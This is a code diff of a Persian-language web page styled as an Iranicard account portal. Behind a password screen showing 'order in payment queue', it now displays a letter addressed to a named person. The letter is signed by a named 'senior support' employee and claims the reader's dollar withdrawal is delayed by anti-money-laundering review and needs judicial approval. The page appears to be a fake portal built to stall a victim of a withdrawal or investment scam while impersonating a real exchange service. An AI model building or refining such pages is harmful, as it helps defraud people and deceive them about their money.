@@ -69,6 +69,12 @@
             -ms-overflow-style: none;  /* برای IE and Edge */
             scrollbar-width: none;  /* برای Firefox */
         }
+        
+        /* جاستیفای کردن متن پیام */
+        .text-justify-custom {
+            text-align: justify;
+            text-justify: inter-word;
+        }
     </style>
 </head>
 <body class="bg-gray-900 text-white">
@@ -76,7 +82,17 @@
     <!-- لایه رویی برای دریافت رمز عبور -->
     <div id="password-overlay" class="fixed inset-0 z-50 flex items-center justify-center p-4 transition-opacity duration-500 ease-in-out" style="background-color: rgba(0, 0, 0, 0.8); backdrop-filter: blur(10px); -webkit-backdrop-filter: blur(10px);">
         <!-- مودال (پنجره) رمز عبور -->
-        <div id="password-modal" class="w-full max-w-sm rounded-2xl p-6 text-center" style="background: rgba(30,30,30,0.85); border: 1px solid rgba(255, 255, 255, 0.1);">
+        <div id="password-modal" class="w-full max-w-sm rounded-2xl p-6 text-center relative" style="background: rgba(30,30,30,0.85); border: 1px solid rgba(255, 255, 255, 0.1);">
+            
+            <!-- بخش جدید: آیکون پاکت نامه چشمک‌زن در بالای تایتل -->
+            <div class="flex flex-col items-center justify-center mb-4 animate-pulse">
+                <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="currentColor" class="w-8 h-8 text-yellow-400 mb-1">
+                    <path d="M1.5 8.67v8.58a3 3 0 0 0 3 3h15a3 3 0 0 0 3-3V8.67l-8.928 5.493a3 3 0 0 1-3.144 0L1.5 8.67Z" />
+                    <path d="M22.5 6.908V6.75a3 3 0 0 0-3-3h-15a3 3 0 0 0-3 3v.158l9.714 5.978a1.5 1.5 0 0 0 1.572 0L22.5 6.908Z" />
+                </svg>
+                <span class="text-yellow-400 text-xs font-bold tracking-wide">پیام مهم</span>
+            </div>
+
             <h2 class="text-lg font-semibold mb-2 text-gray-100"> سفارش در صف پرداخت ✅</h2>
             <p class="text-sm text-gray-400 mb-4">Enter password for Iranicard account.</p>
             <!-- پیام خطا اینجا نمایش داده می‌شود -->
@@ -99,7 +115,52 @@
         </div>
     </div>
 
-    <!-- محتوای اصلی (در ابتدا مخفی است) -->
+    <!-- 
+      بخش جدید: پیام مهم تمام صفحه
+      این پیام بعد از زدن رمز صحیح نمایش داده می‌شود
+    -->
+    <div id="important-message-overlay" class="fixed inset-0 z-40 flex items-center justify-center p-4 transition-opacity duration-300 ease-in-out hidden" style="background-color: rgba(0, 0, 0, 0.85); backdrop-filter: blur(20px); -webkit-backdrop-filter: blur(20px);">
+        <div class="w-full max-w-md rounded-2xl p-6 text-right border border-gray-600 shadow-2xl" style="background: rgba(20,20,20,0.9);">
+            
+            <!-- عنوان پیام -->
+            <h2 class="text-lg md:text-xl font-bold text-red-400 mb-5 text-center border-b border-gray-700 pb-3">
+                تأخیر در پردازش برداشت بر اساس قوانین بانک مرکزی
+            </h2>
+
+            <!-- متن پیام -->
+            <div class="text-sm md:text-base text-gray-200 leading-7 text-justify-custom space-y-4 h-[60vh] overflow-y-auto content-wrapper pl-2">
+                <p class="font-bold text-blue-300">سید حمید احمدی عزیز</p>
+                <p>سلام و وقت بخیر،</p>
+                
+                <p>
+                    از اینکه با ما در ارتباط هستید، سپاسگزاریم.<br>
+                    باید به اطلاع شما برسانیم که بر اساس قانون مبارزه با پولشویی و دستورالعمل‌های بانک مرکزی جمهوری اسلامی ایران، تمامی تراکنش‌های ارزی دلاری باید از نظر تطابق با مقررات ضدپولشویی (AML) و شفافیت هویتی (KYC) بررسی شوند.
+                    و با تأییدیه ی مشروعیت مال از سوی مقام قضایی صورت پذیرد.
+                </p>
+                <p>
+                    با توجه به این موارد، و حجم تغییرات کلان دلاری اخیر حساب ارزی شما مشتری گرامی روند پردازش و تأیید تراکنش ممکن است به مدت چند روز کاری طول بکشد. این پروسه معمولاً به منظور جلوگیری از هرگونه سوءاستفاده احتمالی و تأمین امنیت معاملات انجام می‌شود.
+                </p>
+                <p>
+                    لطفاً نگران نباشید، این موضوع به‌طور موقت است و پس از تکمیل فرآیند بررسی، برداشت شما به سرعت انجام خواهد شد.
+                </p>
+                <p>
+                    از صبر و همکاری شما متشکریم.
+                </p>
+                
+                <div class="mt-6 border-t border-gray-700 pt-4">
+                    <p class="text-gray-300 font-semibold">با احترام،</p>
+                    <p class="text-blue-300 font-bold">رئوف قربانی ارشد پشتیبان ایرانیکارت</p>
+                </div>
+            </div>
+            
+            <!-- دکمه متوجه شدم -->
+            <button id="acknowledge-btn" class="w-full bg-blue-600 hover:bg-blue-700 text-white font-bold py-3 px-4 rounded-xl mt-6 transition-all shadow-lg transform active:scale-95">
+                متوجه شدم
+            </button>
+        </div>
+    </div>
+
+    <!-- محتوای اصلی (پروفایل) -->
     <div id="main-content" class="fixed inset-0 flex flex-col items-center justify-end p-4 hidden">
         <!-- نگهدارنده محتوا با قابلیت اسکرول داخلی -->
         <div class="w-full max-w-sm max-h-[65vh] overflow-y-auto content-wrapper">
@@ -133,13 +194,8 @@
                     </div>
 
                     <!-- 
-                      تغییر 1: آیکون پیام اکنون به طور پیش‌فرض زرد و چشمک‌زن است
+                       آیکون پیام (سیستم پاکت قدیمی) حذف شد طبق دستور
                     -->
-                    <div id="message-icon" class="text-center mt-4 cursor-pointer">
-                        <svg class="w-8 h-8 text-yellow-400 inline-block animate-pulse" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="1.5" stroke="currentColor">
-                            <path stroke-linecap="round" stroke-linejoin="round" d="M21.75 6.75v10.5a2.25 2.25 0 0 1-2.25 2.25h-15a2.25 2.25 0 0 1-2.25-2.25V6.75m19.5 0A2.25 2.25 0 0 0 19.5 4.5h-15a2.25 2.25 0 0 0-2.25 2.25m19.5 0v.243a2.25 2.25 0 0 1-1.07 1.916l-7.5 4.615a2.25 2.25 0 0 1-2.36 0L3.32 8.91a2.25 2.25 0 0 1-1.07-1.916V6.75" />
-                        </svg>
-                    </div>
 
                 </div>
                 <!-- متن پاورقی -->
@@ -153,27 +209,6 @@
             </div>
         </div>
     </div>
-
-    <!-- پاپ آپ پیام -->
-    <div id="message-overlay" class="fixed inset-0 z-50 flex items-center justify-center p-4 transition-opacity duration-300 ease-in-out hidden" style="background-color: rgba(0, 0, 0, 0.8); backdrop-filter: blur(10px); -webkit-backdrop-filter: blur(10px);">
-        <!-- مودال پیام (راست چین) -->
-        <div id="message-modal" class="w-full max-w-sm rounded-2xl p-6 text-right" style="background: rgba(30,30,30,0.85); border: 1px solid rgba(255, 255, 255, 0.1);">
-            <h3 class="text-lg font-semibold mb-3 text-blue-300">ایرانیکارت :</h3>
-            <p class="text-sm text-gray-200 mb-4 leading-relaxed">
-                با تشکر از شکیبایی شما سرمایه گذار محترم
-                <br> سفارش شما در صف پرداخت قرار دارد اطلاعات تراکنش متعاقبا از طریق همین پرتال قابل پیگیری خواهد بود .
-            </p>
-            <p class="text-sm text-gray-300 font-semibold mt-4">
-                لیلا ناصری : پشتیبان پرداخت نقدی
-            </p>
-            
-            <!-- دکمه بستن -->
-            <button id="close-message-button" class="w-full bg-white bg-opacity-10 hover:bg-opacity-20 border border-white border-opacity-20 text-white font-bold py-2 px-4 rounded-lg mt-6 transition-all">
-                متوجه شدم
-            </button>
-        </div>
-    </div>
-
 
     <script>
         // منتظر می‌مانیم تا کل سند HTML بارگذاری شود
@@ -191,21 +226,15 @@
             const togglePassword = document.getElementById('toggle-password');
             const eyeIcon = document.getElementById('eye-icon');
             const eyeOffIcon = document.getElementById('eye-off-icon');
-
-            // --- عناصر مودال پیام ---
-            const messageIcon = document.getElementById('message-icon');
-            const messageOverlay = document.getElementById('message-overlay');
-            const closeMessageButton = document.getElementById('close-message-button');
-            const svgIcon = messageIcon.querySelector('svg'); // گرفتن خود آیکون SVG
             
-            // --- تغییر 2: تعریف کلید برای localStorage ---
-            const messageReadStorageKey = 'iranicardMessageRead';
-            // --- پایان تغییر 2 ---
+            // عناصر مربوط به پیام مهم تمام صفحه
+            const importantMessageOverlay = document.getElementById('important-message-overlay');
+            const acknowledgeBtn = document.getElementById('acknowledge-btn');
 
             // فوکوس خودکار روی فیلد رمز عبور هنگام بارگذاری صفحه
             passwordInput.focus();
 
-            // ... (تابع updateDateTime بدون تغییر باقی می‌ماند) ...
+            // نمایش تاریخ و زمان
             function updateDateTime() {
                 const now = new Date();
                 const options = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' };
@@ -216,14 +245,18 @@
             updateDateTime();
             setInterval(updateDateTime, 1000);
 
-            // ... (تابع attemptLogin بدون تغییر باقی می‌ماند) ...
+            // تابع تلاش برای ورود
             function attemptLogin() {
                 if (passwordInput.value === correctPassword) {
+                    // 1. محو کردن صفحه رمز عبور
                     overlay.classList.add('opacity-0'); 
+                    
                     setTimeout(() => {
                         overlay.style.display = 'none';
-                        mainContent.classList.remove('hidden');
-                        mainContent.classList.add('flex');
+                        
+                        // 2. نمایش پیام مهم به جای محتوای اصلی
+                        importantMessageOverlay.classList.remove('hidden');
+                        
                     }, 500); 
                 } else {
                     errorMessage.textContent = 'Incorrect Password'; 
@@ -233,58 +266,30 @@
                     setTimeout(() => passwordModal.classList.remove('shake'), 300);
                 }
             }
+            
+            // دکمه "متوجه شدم"
+            acknowledgeBtn.addEventListener('click', () => {
+                // مخفی کردن پیام مهم
+                importantMessageOverlay.classList.add('opacity-0');
+                setTimeout(() => {
+                    importantMessageOverlay.classList.add('hidden');
+                    
+                    // 3. نمایش پروفایل اصلی
+                    mainContent.classList.remove('hidden');
+                    mainContent.classList.add('flex');
+                }, 300);
+            });
+
             loginButton.addEventListener('click', attemptLogin);
             passwordInput.addEventListener('keydown', (e) => e.key === 'Enter' && attemptLogin());
 
-            // ... (رویداد togglePassword بدون تغییر باقی می‌ماند) ...
+            // نمایش/مخفی کردن رمز عبور
             togglePassword.addEventListener('click', () => {
                 const isPassword = passwordInput.type === 'password';
                 passwordInput.type = isPassword ? 'text' : 'password'; 
                 eyeIcon.classList.toggle('hidden', isPassword); 
                 eyeOffIcon.classList.toggle('hidden', !isPassword); 
             });
-
-            // --- مدیریت رویدادهای مودال پیام ---
-
-            // --- تغییر 3: بررسی وضعیت پیام در زمان بارگذاری صفحه ---
-            if (localStorage.getItem(messageReadStorageKey) === 'true') {
-                // اگر پیام قبلاً خوانده شده، آیکون را به طور کامل مخفی کن
-                messageIcon.style.display = 'true';
-            }
-            // --- پایان تغییر 3 ---
-
-            // باز کردن مودال با کلیک روی آیکون
-            if (messageIcon) {
-                messageIcon.addEventListener('click', () => {
-                    messageOverlay.classList.remove('hidden'); // باز کردن پاپ‌آپ
-
-                    // --- تغییر 4: ثبت پیام به عنوان "خوانده شده" ---
-                    // 1. ذخیره در localStorage
-                    localStorage.setItem(messageReadStorageKey, 'true');
-
-                    // 2. تغییر ظاهری آیکون به آبی و توقف انیمیشن
-                    svgIcon.classList.remove('text-yellow-400', 'animate-pulse');
-                    svgIcon.classList.add('text-blue-300');
-                    // --- پایان تغییر 4 ---
-                });
-            }
-
-            // بستن مودال با کلیک روی دکمه "متوجه شدم"
-            if (closeMessageButton) {
-                closeMessageButton.addEventListener('click', () => {
-                    messageOverlay.classList.add('hidden');
-                });
-            }
-            
-            // بستن مودال با کلیک روی پس‌زمینه (خود لایه)
-            if (messageOverlay) {
-                messageOverlay.addEventListener('click', (e) => {
-                    if (e.target.id === 'message-overlay') {
-                        messageOverlay.classList.add('hidden');
-                    }
-                });
-            }
-            // --- پایان مدیریت رویدادها ---
 
         });
     </script>
